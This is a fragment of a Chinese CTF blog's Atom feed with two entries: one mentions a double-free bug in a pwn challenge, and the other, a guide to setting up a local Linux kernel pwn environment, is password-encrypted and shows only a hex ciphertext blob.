&lt;p&gt;这一道题还是我学弟运气好，碰出来的，vector容器free的时候，可以double free。&lt;/p&gt;
&lt;figure class=&quot;highligh
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="double_free" scheme="http://Whali3n51.top/tags/double-free/"/>
    
  </entry>
  
  <entry>
    <title>CTF中linux_kernel_pwn本地环境快速部署</title>
    <link href="http://whali3n51.top/2020/03/29/CTF%E4%B8%ADlinux_kernel_pwn%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2/"/>
    <id>http://whali3n51.top/2020/03/29/CTF%E4%B8%ADlinux_kernel_pwn%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2/</id>
    <published>2020-03-29T03:21:38.000Z</published>
    <updated>2020-03-30T05:43:16.049Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d15623faa7970d0a6598540fe8df01ac388165e186400e340a151e80bd3b43ee">678f68787feee6ae93f9d2d62333a167677ad87aefe494a8d8134a81a14419c0e383318d0d996f553f26739fec70cd022011a842971cedc0433c4b7b7d957293df6e96789e4abff3757c76b74825a5dc0a4d90587f7414a0e777352ae67087d3bed600689b9057a1ec153279750f9c088113b1c3be6804e97314159321e862e5ea9736f421d1f8d737d76896a44364b17ba4e99c2779264583f7a37285be2a6815d12fae77c497476f40da0b5d307cd72360c23969cb548aec1fc6ccd045a446bfd4c3950ea33ed13e58042192014604d1df67dd72c055525507d790f07b8e446838d62c68c9c982189b5f984ea0d73ea277a66104195cdd2cf2ecd827e757ac2fbf3c46e35147b030fafd1d834ba828a5da7172a09c18c3f5461821ab66d1e94583be50fc27321b22728df48b4a9ff35d016652a578eabcbb2719a74fa0d271eb940c26fc54d8c1594f4fd0fd6eca8ff6d19138b051b59ed7bec1ffbcff44bf0209d33136cc515ef22da47f596ef66e4e428eba5c67b464b7016a9a04181bea86029fa779708d1dcb95d7631d13f828a99123af082e235e645ee04ba87295285076d92b98e03f1b0d1620861079a135e04300f727e1cc517aca9af235a803ece8d32e58b4949e2ca91c5aa41e3d7f5fd6878cc576a88be15bff2a8f81898f0320f7259eed0266611e77cf0037ae39f169250636cced4ac848faa867819e7a2632966dd1c437516c47de39b0ababe44ff69143aabe13fd9814b2ed64fcbe194ba1bc177441d5b92452f25d8d1b93a134d061b8fa3e2d53dd32e88414ec5d2f902f52f7156a2b4ec1ac8c1063748fd533e9f673540e85cda59ea1bf7d6b9334ff967dd429a49608b7ac47ad0b8ee7d48aa172546b43c6a50736a8202f3ce7c7b2a92d46d2925eb5260d8fa2ea96517edaead0246962cd2800be65c09fadb5404c05ea6f88de3456a03e39d57ca627996afe6fd60501dcd12859367436966b94e58f9c696009b4c3aa7d478d3886bb1b712911ea5e481dab6a363c9a54594fb6a5f7769fcd01db88876cf45fc0b592abef044f4ea0ca091ef0632199ee3adaedac2af94e81b8be9f8c980aecd076ad2f71c8a8f29454fce7c10ffe821cb26e443d606c6e1d0e2885b363956e546c5d39589ce48a34b3a5aecf52ddeb1cf8b74da32fc68a588add67851a9e47f528ecc3e92cd2d03eb9253aad35f48c21b95caafffb167645bd27cde1af2c0e69fa6aebdcd5445f9070b498e4daafdc0ad6f962d2c8107c791535a24bdf298dfa06fff43a95f8e8be0770d4226d602f8ea7ea6edc6b7ce288f0c026e447c01767ba6cfa861db319db64a208fd156ff4db18edca8baeef199342dd31c429a46b1134c99769e30c81eb0c453823c245a818dc7f3cca871b0ea4875c6bcdd5fa02178ae444a0ab9c13047079d692c6d7de6b473b05a34a28e700f65e5948a3311cf99aa684b860cd9bd4f8f6fc50e982f90c84c29a51b69f85274aeb8a2d0447c0fa2c655abb4caa5baaec0e766494e0acd3c4664d75dcd58d1bd23fb33c4f51b4eedeeb523e6be8785e0119570a9d2f278249fa91efc6b6a67a9c8cff06cc7a717b9b1317b63717dfe1e5d458d2e46b7a8a7ab68e17e1c40f15b05843400050ffd47b8264f8b802319dcd53b6097dbd6496b66dff28e67f2f765c41b15eb12f723343ac5eeb71f3452fded9e665b6ef2c0f0e6359e141a690021157d4ce71009d8f3b75a176f29f19b72097b77072b6a17be6a5f2cfd2f224e69a1f88f4203eac8dc97772da1922795ea9e305987a680393de1783264094cb21aa84b36d98c8c3f0151314ef6955cf405fb538aca07c304b62c2abd1890b4e59afe8333beb4c7c50fa6f1d24791eb5ca2cec284dadd63253ce3e4f8bdf36aad48f60fc7d0b31e35f11c80018498e967289d265c6af58048b021a7e513396fbe7d9989b2ddce394f3d4130a541e902957d936b599904c07868da5fcfe8325ab808ac678cdbc6dc9dc4fd576845678df39758cf8a0a58778f77d78ef31e0509eb3ae8a7a34acb6d0f12f4f4de7b632990e413628102c7cc0cc10555449f9411d97a6fdced0ea47877a651b88b81d76f7cfc8a92c5bf04f05990cb38a832bdcc8fcbc39ebc02257404afccd44fe0648b885ede4c6ae1bac33f240611ff029b240174a87afd1a74810b79f3bbee30f83080820548c0d9833a66d9f28bdac192bb4e6075c0a08efb15d66a0846b9965c211ef25794c141c18ac68caa188440f3a823123458ee0c3fcac0ff0abbcbc38bff6eea74728b37101e849ed9f94ac1043091cc03c773d4f21ee6b4c6d4ab768287218e292e324bf365ec29aafb502d40f4c9ab4ddb275e64aeb1b731301078a27025e6644340394ca749a508711f330c6bc04e6ca7fed61d12841ee222617113eba8ca2875bf058b1f760bc5eb4e1799642ffc147ebf085d6e0e4fd7de7ad56087822f29594418a320ba6c6c4cdd537286675f36b45c5ad432ad561f5ec4087442c5ff9a20e41946313d8d205db2eac9a8763d41771de5ba13e2e8f92ffd56e8a6083f798203b21d03515552564f551d5316c54e8618f5b3f7e943cf67085ffa66f9ef8af4499dc954d52716f83ef939251e06bc1834e1bc3e9b596617f8cb76136e8b7ef5f60bd61ec91aabdd7f6102c11fb14f6d0ed3ac68d6e547b64ab9a8597485f9db611512df0b7e346f0e4bc695622fc281edd86a76868115d1a2b81c14f3c2dda00225c50fc2b0d0eeb5898b70b66b4c242174efdc3a318d31c32fb30299de837ad07df434b42485df056d98ee83370c6502264afdf630806926329b01308d1fad06af5a1fa1862b7ab181f67ef842a061c1e3b2c25a0a1203f9ce45f0dff5e6f633057688efdf7084f26bd64baefed1aab5e01c9c4c38cae62b70001bb34a9450f14b46f7b3e19ff0a048ad8fa5c46e77016cabdd5c92ed7f71b145909b001e629f302760d00010e2c1f463dc21ccc0ab0a980bbf5f0f323c80d268ef9fa0b80fd937aba1761b0333bfe7b0c6d0e4992563141824969d76f261e0b14267ed3f241298c1c21b27d9d9b90ab9d3f3f40476e6faf38b84daccaa42966bcab54c0af783b7a146654f6c699bf29cab8db93b55f11dd7bb5cc6abfae9003f26fae6b473393ca7d79497f24d3565a08a63702f635ea0c6237e002615a5a33df630e5ab883bfcfbc202db40df67a048d314767169e77d1c27c5759243a6bd2d705a719fe237535479305feb4d2d39ff49c233c2f3290691417e499ff648b9e37ab54550c2b510ce1946dfb98c43cd14bcee730594ede01aefeb0b5c6d90115c4fa2e6a8a62e73fe456a7aec6b571795307393120bbe7b519f527e74073e035b68e200e1e2537c9b6f117faecf45090b554e50bf0a26df00194d9d0f377b83ab4607eb82c57f50dada0d071694928cc657961004566ad068a26fbf0f35c287c969572be2b937871873c1e4d384f48f0e2d247ad57b41e6590e70d0fd93eb94f9ebe68c9887e2092b857327bcafe5355c74c0370ccd5c177ad0842180b41c180371630b9cc788dad0d59940475d32b9fde7322e3919a786f3c66065ea2e6d116029567f62e6c975c07cf6ddec861b6f95e12aee3f8d407a83fe25597ba74d1e8b3ce71b405754f251e490aa6d3ea7c009cd0166a1645bfeba31ad289cbd13f69d42b4d5ec62d78bb2854124dc3cffa2646be8a45ff7f1913615c3e92bd92fbbe6eaacf9725ca6ff408f027459f47c938d50319e4328f7f2ffbe19806d74b98ce3ba59c91ef319b7c459b5e83b5737b05e0da1752d50d1572ddb32e5f6ab7e383d18f8dbc49dfc6177d2d4d6154fe6851401d25441664a876ad6de54e9614cbe1a9df957902bee623bcb65ebb0d1e84782175ab190e3e395827ca5eddf0383ebdface711a4f76eb892d58807adad50f700207d63b96dcadac36f741593be9da18fe00ee1e00b2cff05450db9791595b2d515ac9b8dfb6c4f16d4e9c97b2488915f3647abe7e35b9df63fb4fde152b8c8fe3bc337342e84b1b0c65b8bd498a3a32f2f43f7e775785b04d7a9942ff25319de5ce3ba3ccd6bd934e5d1a5bda7fe5b0a26119b000b88a3ff0e42bbf0986f43dac9048b1c5d6fccb8c8ff899ec96007e0f53c769d4a83dd77abdd737910e35d5d02736b4ca6862afee0aba445e1ac42957653336848e3b495cd1b560151f2512138a58debfb0ee152aa5f733c18c5fc2b27f3942f3841b6d519d0dc747e4ef82c5b39874b4c895a8eadc44bf22ec4eecb5a2f2b64034e3a91457cc492230569df2bd7815970d7b4160e12b33e9092c007151a8201681f7905246bedcb916e6699b4662f75bc6b511132cad3d086b3be7681348378ca57056a5593faa716719868858f97087fbe9b9c461b37ff6aa4127d49859090adea079d72a5ffa48fa573b98797de048e13cad488b0e9af9937c740dcf129e9fd569ee1bedf150bbacbf67f89a3009e86cbd3e3a6a6034f4f91b2b5a255bdf2437c2410c9f35f8ad83dad8a6960d5cee1118319e5ca087c976a5c4351cfec3bb3afc2e0b6d330578c9ee4b625bdcb1cc6af193633cb48537fe6fee85db81499f6d698763dee8e7a0d27cc72db81908d36bdd2fd02aff3030a6be1b42e676eacba60dbcf355997c28ee84f8236d3cc47e0f44597416c1b6ccb38ed9252211e7f9b220a8c8b9aabf57ae8b645c610e946ccd800738ea0eb4f827e128bfca67386e0896ddb475c353cf8161a6d657c46408debb9eb863004482811f5f103c7220649bd45dc70aed52a9206da9db98f369d67484f1369e598dd040f11688f87b4506e2ce16ccf568116b424ce401bb209c707897fb190dd56ca14670efb3d68736a6320b25fb4b70161cd8e1ed04aaa2f7f2f8d4719b5254cc026a890c806c5fb195808572866d3d209e8419699f533f75fb158fc984d67c395fd439e46034d6d7f06400978d8941192658dc90401d12139be2a5f46defbbc7c1ce97c7a530bf56762a5aff85cb78843627aff8cbb8ec2d822d999ea5d3173d3226515e7386cb2fd318a3b62dcde9a580ffc5c0b64d6e9589dfdd8667244c9509eac871f6ab13c8f88fec5d5c45f5e4f0cd370579faad6c7c574d6c7cdcdb33e9cc42f578ca2862e6e1f8c795e18f5c42b404e1605d5681ee89e55df5f65cb45669b77054996f52ceaea0bda1c18f92a3a5bcbb16cb7112caa421cc689c24560265c0514644f2a93f379d4a50db566d3ed9de4f0ec3912e4a17b9ee95c6de28707fb1934d8aff7280aca2a4d077768ef12ed864d6768864d4d230eb33f3f0f37bac5ad7ae79c7384c49b86c5ffeec9b2ec5b50c8d7798cf6f39d22650c31263c4410aad5b75dac238fbc21613e48d62bc54577063ae910490f37dc8062514c4e2eb743c9da45b8574662db99a4f66976b5117f6caa227a1fbe56582126df755bbff24ec4e5e6f28e6f9464e3fdc5e6b846d8ee0743cc978a20aa252d63c0ebc0acea4f0ba5e3baf8620a717e156d25d73c98b5aa748cec8fe4ff46a19da3eb48183985c6abadfda82b817317394f4d48da63550218d5f355ca6f092ef11955c0e82ef3ee9ee8c841c7919a288ec593ffd87d8a6a7b690e5f49a0789d38e7cca8fa761a7aff4739addf121b1b539dbb30434b75b5a552a01f9bdc5335f964c6ac5454e3946a24877d91a1f0ae9e5bd6ddbb468ef6da82bf565600aff0ef2c0bffb7231d3a8b4586b3c459489f6049402d1085bda496a9e446afc8c9926b156eb7b71ea891f9dbdd622c3a70b3f9f5fddea7714c197c145118d210ab886e729fd39150739dfdf22751d43233f2cc1e170baf554a0b45d86ec484621900bebba038accca1c10f783e9ff2f7bd31e1e913a7119bd0c93fec9dc5ad78e0753f41d33acbc643b67689b0974e9adf4381c2abd382ff9f9f12ccf20d3417c3cb8c0a732472a4a4bbe0bb0410d4f106f9ff31e9aa188c24e865d5663cb85e0b4314d5c4381d5b6de7ccfbfc9e8d7b27bf83a4987ef673877cfb0a4ebc15b174464dd12c0f2e05fd0340f5bbb47ac57cf959681b71a2b73dfe77c8f2658889144a77df80fb0741ecf7660e8975b9d319f5934288412f49c8a6c7fe76c8748996cfeb87160f200d1357152f9f22f424f65a30d59bbd0c942579c5d755b1ce25ed92d6d5f0e3d88325d034f70aa76e1343b563f5fb9c959a9dfa85b8152a82c1ed91e09e5326b8436cc5879aa5e8a910f6979bfb42606e21193a2b43794d673712da7feb502d66cd1c79bd9f838582c91bf31d93beadf536b8867573de25c3f88913acf65637ae38636ef9145e67623601e64d0ac1bb834ab1d92b39f4720d458c6bcb3948aeacd82ed500b76519d81736442a1eb19744f0a51c39c51c23a8b0c62a12c2d904a7853cd64848bdf3505f22ec369a75683bc1a2e5407c4f53429918b9cff11776697a7ac632b591d3a8fdf866417837eb132b60b3850791c0609633eb5cbe10e73b47c4b515ef39e374b35a3b3d049480359f079c6fc4e8063e7a388f9985df8fae2910da8df040c7631703e96219a6b64cb2c6f2d73240031f9cc42d187e87d75571d2bf74c88f83aafb3b643342cc28078945610c7ce0900df4ef4f590f88f4745ac6ebe633d02c8dcd62f4758176de6c398965a0defe58223cba0ab862fba3cf6a87235c70d942ee5fca1328288cc03e14b3014616b7da37afde10f039c8cf1d5b615a567f173d108e4a06dbd8731781c00632d0f45a6b183fc6ecb74ce24c5392955deb7e5b7c5738a3b70b048c9cd9b8f9a9ec0a91db2afee39582bee0f612159a790ac7060196782224a48729695e493112f0d7886299b2601155e07aa52f0a877f0ba30a3358caec89e0aa195c7cad96aeb9c8e7176c03c3f92b7853896f8ea9bf1648bae52815abe5a28a2da091e9d470d8c9e05377101b28287982d24b1235cc52ecd7771885d70a48af3de7d956dd05b92bb764200f4360338c80d7bb9deb34b8e5b30033b0147c878a68984068517113d67f7d4ba552c737770a912be87c5bd997eec6ebe131e24b1523bea297a6c233fc909e9bacb70a6befa054e16a3cf9c7330ed510fa5f062fc5932e4a063153e9dde06ff0d84d21d2101f6f25f33cfe54fab6fab92cee976cea2bbf3ee230d10cace7b655332af05b94ecbb54361eb891d4fa7d2ae26ca8c292c970b267ae5d5b2941dd2f17e2859da3de242dfaf94f5f4be0579246eb399061a7f06e033a6c583d88a918b23a79583d6ee338b763a24394760d3ed876efaa98331c02a0d4fefaa587475b2689ca01f6e0e77c39d965b34d46cb5ed623aa537a2fff26846029365e39f3d4c439ead228334c85ef05aa7908636a3cbd14610129d087399d22a29515af4c9e4b2b6f3209af12f152ec62d2012c6922254691182052992f0403b171540e241839e534eae029a71961102186e0d3fa3120cf968c41b77476d4e958482b4e5ec79ae5d2573b1d55a4b312503ab96773d2cd598e55f8d612aa2d3c6bb69b48b41f6b61f594a6e3217fbd82a6e7c9efffbde16b31ebb06ce88d6a2ca1b10272923f44d267ea44ab987451074a2a613a7c9c3fd0bdd8b98b5e95079ced97e5d4f4e8e87382b59a138156eef4fae0f7c4eac5145f26b16eef0f6c92ed1b88e6223393e3bf2c523a99b75876dfda487ed7fbb41fd46c8d950a5e5a29d7ebc6e226fbee10a44273f9df68c6ab791ec5049b87ac58f4677e994b8da5b2abb40a1e50589afcd060a7895ec03a20d7f7a3404aafc1fa8de830d40df87924b65821889a82dc7897ec6d54bddff50f7771cea2d444e654f82a2b892e0d13d7e9e90ea2d6d72f68977cbac26f637976b4c1fc391d78a4a2d33ef8619cfbb9107a0bd5df43db93c87ae0f538d7310804a21f37d073b659aba7c9555f382c0f3fb1d895010fae5e664c7736b600a2b69b45b01815fba2e217c828f04045775fec0acacd1734b65ccb66b314f481a78d3fded20647c7a0f42e8c761e806bb59c970440530fdd88dcabd3dd51394d129256d6825259162b2d2a3c52216e07bf82495c8a5f961a16e2f49f24772ee877478353fac91c76d723dbb0857ff9b19712005d9666a4c43285846f3967f012c0927e1290be285c6ecd8c2edbba0eec691ec11c92fe700f5488d803041d9bd23d25a33adaf8b3b9f5eef8be1e44656c735bc244c6e6fc2581f2360bd1385e17b262187fee949af7b7067fbfc556272a12e7b2d0762d6d7d1b1ed84c6acc06e0c25deeb78ecfdafda5ebfec0524ed9049f5cfafd79e0bfa0f0b45f84d5ba54115fefa5f1087a571f4546b66a72cf316e9add5db35f1bafd6aef5904a5195ccaebd5ac8fe7c6c730a4e3c79d6734409eb3b0f5fa47080a9acdc6523ae2fef3766239967a310fc1fd1e5ab39b5675344471e1f52d61b2a0e724573b89345410af7ba9551c9b3517ec2eb9634708683bb87d6279cd2b301d6228cbb45d1564ee3ad7a7d0020bbc47d20a046ad3744591797013950c4e5a8a89920597a26bbcb288f5e3051a5d4d868aaeb13b8baefc40075e0c06d2236d7dae6135431f337526ce9a80f5c5743cf96e49d2cbafd06d06cf86daa3f4ef09e1ba63a4c469a8f83f5501d6af126a397a2559e85969560405f228ee8a54db75f74d1c97100d03abea0e030328a4173bc3d468fe5339d6738b7703ebaebd1c77b669dfd9de28084b04915c75923706efba15bbf5c47caf91b5b8da3a9d20b2d5decc233984608caea29c25644d0ec87a58deb5bf9b93a0abd68abbc9250877eef3f476527f0c4ddfbeaee79e4e0b5ad150968e0ab13ee74f6daeeb9914cc92d89f3d1757df6ff5be376df0151607fded3fe3d082659abbe3a468198f5be67d13f650ceaf490f3d8000d0471a92a0adc80c87bf140ffa9b556f2ae95b40219237a0635be013a3566f986d3297e7096c3bca86ca416867f163996e52aed1607fca8d9c214618ed09ddbbc99805b997f8d9a27216b991808f635890716599e13304ed0d8c69ab7a710dde8c180ae593337d62aa309cd8011f5b94b9a413ec21bf46a4c1e9a23f77ce004a23c8780c14fece6df7684c6c3db44dd26e5fec2124085ae2bec3c26dcdb184b1f84440902021e7cda79a488b538eff591e68d55025f8f5dc0c6ec961ad3bf4ffa5e2a05fca4d3131ba6f2382a9fa3ceeaacd9a2147756d7c32e2326174392981dc80d8dc08cb6be8a4b3c58cc8145af6eb95f5f76e2763ee7f9aaf6882a4e772acbc64e1cf0138d3fea2071067673118b1def877f7f58ed771acd7717598d88dd1350a0488b1b57f7cc051c2f3cfe8cd9ebc0ae136b8cbc5ea2f7cd0bf718fd756dbd27fb2cee9f0c043dacc8e91b3ae3aa8cd1d7f4492d475fe25934ecc44b540bb533a3b4245085418e1c71c0f9dbe98744a8406e14489d3c44a3464a69bf922e385ef48109b5cd73d24f47217e756f7fc667d0cbae5780885a87cdcfdd181f8ac38484b697ec42de1a70153c66a7fbb570c825311650c594f95d1e1e17866417b0322be9ef204521f82601afeb3eca27e4f202e6a61d1c558d7df2464f7113408d529539ec671076bcd8fc71ae6a3f09e848800ea298e685c838d0d1cb4745b2445860a3e7ef62a8d8ef964ce61f0725ad2db1f82f0cf6cabd9d42e1a19a60e2e3e36425ba7bfcea081c46b1724845ee01f02a51f82bfe36d9a0a706918fbfb22efaf2cb509d49e05fde59bee23644f1b27b6d9c1a84d25d6081bc920ff4f4e9daa5a5b4544164ae34b83d1336c8eba8820370a1c3dee5bb05a3eda0ff39cc2cb39f51379cee1716f121fc967848ef49917021935a9907d1d20c0ab3b526a937f40576750e6a6e964f0d60a5e6970726f16e2afb1739456eaf9b9dd61e1ea7d7767a7c992d3fe0730bd65b2fbbb2299bff065894da06f020be35ff5157c58e2643e73fa7621013c4169716fb1a6b3e5c4a9249b3a31766ac82f51fa2a694e990ee4010e8d1fb45ecb352a04a1d3a08db50fa8ad57cf297e4ebbd2e7ddab0c937189dc7208911f613b5a0a579d011f566424658fc15556fe7efdaffbb0507a73578fd13ff89b1e0e3b9db02febfb245d09f179a01a8d0f48e3661b61c931abb465a6fa0f95ac6bab4a4c643c8360cc85af809744ae3ebf270a12b3fd0677bd18ceae67d661df3d0c69998afffff5ed65c2657841c9d129f21adc5d774ed2bff6a12d22f5863464351a697911b07f51cf0dacc05f8fc5638b7ae477048b4db134379736714505687e5597f5c6b69f9aa97dba61186823b0350a80823cfebe44aa1de042890332d2298661560ce05346b692a33e41776dc05e2f4fc00c7e7e5ebd4f8ce269304b222cdc52147e1aef563b61e4da611b21e23a3755f1dd7fe1ca77cfae355215d9b82e5391a7ed186fd9f4652ee67372016be100df5affe5e9cfa062251c3ff3582d01b467edab3df42e31962d14a3db61e623591aaed72131de672db8895aa82718e4bdcf81e29c0fbeb1d5511746aa5ab67d76b2fa0b2259ec6dcb39a2a0cb86b79c32b308cb51b235f5f080bea69f7935d3c377ccfcd9f0df14ce07793d280833569c2a08209a73739d6ab6a620f7ba52fea1fd9bffd7ace2ba9c60dedc6c314cd127e90d8b2cfaea872af9b41bb8fd990bc882f80c9e02c93c63d033b5e7e6e8fa5d658d9fd7947a2af8afb66dffcede6ba59a346b271d856d7fc464f49d56074880687f980a668a9ffcc1a0aa04093c3b81ff95ceff7feebc4809bb303c5765b0f819476b6c0d9601f8850e43c4e3880cdc3965b094fa0a8478e01dcae44d08752b96a117e49275d1b35b6aef0dd3bfeaa39b6bf7d5f1297615d1a772d7a96424e52abf374e307d7b46a41d82342484ebd3688f0e8406bb0f645ec3117dd11f126d6c7c7fc3a5837312f7abdc3eee17c0009da48d4d763ce5e4cff2ee7baa71c9ee0759a849690cbfbd51a1f9147915d2a3dbe8754b92f52a6b8eaf00e6a75bc0592ced630373aecc1a65265ccf2ce3d9ff72f6513d617c0857eca30f1cf3c82a9d3e66bd96cb7a04276cb30035888d280736f6b248c8d6cd3c45473a50becaa7441dde8ac07bc6cb3cae430b0444bc3525f4054cc0120de87b0d757b7f01887cb8c18dae80c22570294f4e5382902e45f9039a49718acd86c8595015b2675b63d0c55bc1ba3ead65e1a150752367f9a294a40ca9214398ca5f2729e77c497109d856d58d43ff606b8beeda8bfe42076b179aaf424a2a61a349a9aed0be794c160b61b80069015cadfc61e1c7fee381875da5232fee9a61487a7b26b89abb310b249d3d8e60845b9ec8ff0fdb424dc1d9c8f69d0f38848207faae9f450501745d9c723c66f2e1c491c31b78d6ae593c167e9d20687347b69277e98499c84bf611bfb2bee067311c404fb8caae99154d87bcd9b7db1d873eff9145b78aa3b768df7819eb14adfdbbbadd0a5789995903425a25572fc3ed7db778fad8d203fcb8c8c11311bdb81a3d7cac3d77f45b80fab2f7a55b76ea485bf1931684a69cf8563bedfcb1fb4499b1f573cbee72aa95df9c1de0941e76636213f649dc5917aa4ae0167dd87d8adf86efcff00d69e8e11ef49e476f79d9ced97d93c4f3df55d7a728697f6918de31f89a3287abcc7a809c8bb08e55e00723364d8a596eee04130b9f4aea5f4b9508307c3e7e57d894e48dce93b04fdd03f896eb3825b2c67eeb976b2b9759bcdea7cecb1606676f7504f4ee7fd4ada4da2aaa2992bc8242d0624a9465739ae8fbe154da57bd1ae070f283d98ca12419d7dc90594008a28899ab80f8a05989ab32b8f6950a286abf2d6a7606c618300d40730bc4e02a42209583f7e0370d5beff2f79383bea573590e0fa722084c16822e9b2ffaf1ea7a828127b0b3eeede63ba76e3ca79fa8bd8b924aaa65e5b715bc5648b4869c6e0f23ddffb97460da489b8a9faf678e62420459d86776746b7eafbc1a00dded1497554dde1e6637ba5def4cde9916bfb0581111299cc1598b89334b3dc5a1f740b08454b21e2ee498ab6867e4ca23a319d541b4e1361c6c2108ec8079142edebe940fc960eb9f6cf1f857cac59663e5bc8a666db2b89e8049ebb7bf9197b0b34fdf5d93ced1dace133c4550bba8b09fa5d1020c66ba967e55221477103f0374a2b612f14acc7db77bdac37acca95ed91a4a5522688b23484f6adc66a958a481bacb7453df55ae65f79a196aaf38425cb5521365519df92f63a9759a104651fb0d8355171bbc59e0d482eb3ba9f0791a786a4160225bf23397a55a017c81dcb01824ed8b6f1e4edf0a53a174aa1e129789b7f3d145e4d47a5f9ff3a31349b9ff561667e7fbff6712dd872c32869fe800180be579ade42d11456cb73d11a6a0ff7602607afaaf242e05f775e1cb4419d355134da4b12fa07fcb3eb2d2b20c4509b4749d12e246aabcde4678a80ed470fea8f40b01ec5f2d099fee36475f30c0f7bb382cd1a70d87504a1becaf6b3c1e67a930ff4fa784f5e8783d8f5c7aee432036b20328ddc76875524663e2ef6e005bd58039eb9c2e2d0070aebf6952268023ebfc28cc2fe74ff31480962d82ca17542f4d722195cc589073b37e0a0f29a0c453b6e6bab92e514f896afdc0c544bd0f809246ac3c5c658fb9c35c767fabff96a3de560d0330655ac897ac6fa63b9d628af79bba30b7dd84a58f09b237e86f4d06cd13e6cb2da5003b13c45224e173a05ed4a6c89db75a2b3643c28b91d064ff1a5db42f0aaa0ae8fdabeb0422f14ff4b6b9323184e96ddc753691dcb2f1de8dcf6fe0fd8d3d6c6d7f02d571db28a0466324ebad4bacbb6ee86e82843b5a927cb90e4df609cd4411934d6198292ad0d912b2c1d6cdcd799a077aba434e94d704b29d0fc8caedea7355614d99da10da54728563455c8282c301903162f63c3fe0a075a7e3f86182cc4abdefe214957107b39f58ecb86562a54c8fbdfde1e6a362fe0aa6c4a479dc1eea00c4ce0a116871049f7c51c270c9dad676cf2931887c99ad983b6402eb09b9f8af2cf798cd7bc180272297121f5b6bc36cf111a8e31572e7ea6954285e0a4004cd037869f734188f0957ba3fd0eafbf8a02b59fbd1e1599761cc14713351315564395fd0548b01ad9d21c6e8de522593a5ab689a0e8965786d5af7d37de6761e2013fae7d765dd2e9b6266b561c35f1311634b9279d77253992b3ab72c56113d0db21a83b187fa66d303efe6944f26e7713f65b456d8ee1c172b8180b559ceefde84faa11dfe227eeb1d1ae83127890782fb8d6d9db98e870b8f5daf5c392c86f85231f060601b67d09c1a6fa4d3210407563de50792809fe1867dd4a35679aac54f04e6b0aa411f6b8bb086905890c61bf16e5094b6e44845de9c70e3af8862dd3b0c89e8b87036849e0c035c1ca68646cdfb6b7c0e846f8279d7975350f59d4bb0e24e2576a162a649c11c54dfc72405d4d569ad9f1331f140e453e00a57e72451c5f1229dcde3873e91232be1f0604363a1b3262324d6517ce598ec7ee0221110cc19f0c6e9dfddd84e3a8381366f032fb08f707f58d35c529c8bfdccffe0666075f85462851837d9e69b09adbfadf50c426fae5ee990c61a6c6fc39c52de2d9a867d56f2adb903eb6b45a63f839ba1fd61af2f722ef3b55be2a0cce37630a564efc3a2618fe61e5905a7f23573661576f069feec0a6e6ef124323f411524b02dfcd9adcd7adaec617e9ea0ee376572b8c5cfd7e7cf5c4e44e7d228efb676ef1fdfb892570c6c9dbcb30a289c6ad1fd9f4e426de51e360fda050361645bd836648340ea1fa3d8031115b6ea6bc4a13b447f757698dbd2ec3ad8306789bef65b958fc536bea103c9b0f0d766c3104abb005802efde5a47a26f71f739351e07ac2ea1e6fd29daeb0ad758daa99273b4a711c162376052b3fdbd7a8e7616898843f98a6b0d596b655191498c97e6e41b64045f3cab08c158aa26eb2dae5f8dd82df1dde07c5c72cbc4cade88fd26b7ca2779e309940330151c88751869e00650aa6a950588420307363c21273bf9235c03c3126ef4f09b8e0ef26dce38dd8d5c47fd1d98a6c66c9811f7dc69ca1965c557d9966059b92ff9258082b78b9ce567e286e663a303dfa2e9e5ab5594eba803fa8d5fae338f520a6f310a964544a058ce8080b6e08a27df67b34228ec746132d067ddf871259ab53c5e5108bad9eaff984383491412aba21f570b5d6300c921a8a21e4e9daf28974b030121df0545c764fb92d97a0fa0534475757a5e7d58debc01af935da5a56d6d02d206b7906e0cd5646d80cd90fbc49b2ca2d1e45ea9e96c987ef76f5eb49c6d6d6ac4401bfd91824913b8d27e455d913fc16ca335424dca8e0cd71b749373ff2ef8bad8f325e4636695c19fc657119983bd9e9a3e73ae27fb0e52cb0e1ad31961d347bf4e71b6bfb0f748c17002d75210ca8bcf7cb03954e563a868288dde1e3ebf98cb028453683ae395afdd30b2979b519d3d8551c6c03bd9182e688a38723057c670250051bfa8bda8617b223f991f26d16b58a7d96b22708ee976a02fbf5531fbea9c7f90882ff3c40f7698db8181494cd3a32b73784780ec67aabb365cc1001513bf711f55cd6c1e686769fd56359020215ef6d2db23f648dd70b438e73fedc4c93539395dc37436bc266fa0932abc354067eb9a5d580b6b6d04f34916ee62fcf05f3c5044088843f8a30c7aa1a2215e0bd372e739b5c1909b05e93154a4b01a6f560adb9c2663511668e64406e98bcd926c643ecd3ce5fa903df1e74929a3b1f976df4888f893a6c3ca1d733fc80533f737541fd7d1f7d4af1973ac793320987fac99646b5453c12d18feb11ddbf438d40cac22877ce8a2de60215d2958661c8a0a3789bc81f2a083f93410af428365dc420c52da34aca29a0ebaac1fe22d8b52c74c156c4fb5c767fec044b9e1df30eb8d95940672fed31ddda38e32564c7930f909b53e0f1e38d2439bd9808bd7f16fe336942b358f4aed1dbf7b0d5a8d994f0d360ede8de77471798169bb9406cbacff8ec1a9676944c42907f5a6945853bde798f8a0e84fa262f9e9ed32b9fa9dc5174ec68f8020bdff6aace6e3a2ce3d9ba3a5f4094b80b6fc0b6aa18bdc7908ebd187addc2f465b19d6956c84c8265450872ee136ac56eee4082e724ffa0594d335e60a8e28fb65050b88c6485b065a10ce367e9f4f70325309b9513f60fa23b6661d7146f81a34da97f98d2468b66c62c67015281bf78d865f0fcd5a1366553bc9cdbcd5590ed1419c4d8aafd2f6dd2b26c6ecd646d090df9cd1db231734b8e72e2bcbedd92ab4c4902333bae9b8f795a1adad1a608120c3665f754362975655cabccccd84e83821c98162064b178298c96aa2582441124715702969a831f5261d01100596a070f9d8c942af365b96f377a42309a147aec3934d8de6cbf772dc205d94589740c2d561f70c48d4e015f76d2c4e60ce8df5917081d642910300377af6af84c7285fbca2de754871e1201a47c9054444bffe2248f678c17b5c99d351b96ff